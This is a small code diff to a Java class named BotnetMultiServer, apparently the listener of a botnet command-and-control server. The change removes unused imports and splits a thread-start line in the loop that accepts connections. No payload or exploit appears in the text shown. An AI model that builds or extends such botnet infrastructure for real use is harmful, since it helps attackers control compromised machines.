@@ -1,6 +1,4 @@
 import java.net.*;
-import java.util.ArrayList;
-import java.util.List;
 import java.io.*;
 
 public class BotnetMultiServer {
@@ -16,7 +14,8 @@ public class BotnetMultiServer {
 
         try (ServerSocket serverSocket = new ServerSocket(portNumber)) {
             while(listening){
-                new BotnetServerThread(serverSocket.accept(), queue).start();
+                BotnetServerThread serverThread = new BotnetServerThread(serverSocket.accept(), queue);
+                serverThread.start();
             }
         } catch (IOException e) {
             System.err.println("[-] Could not listen on port: " + portNumber);
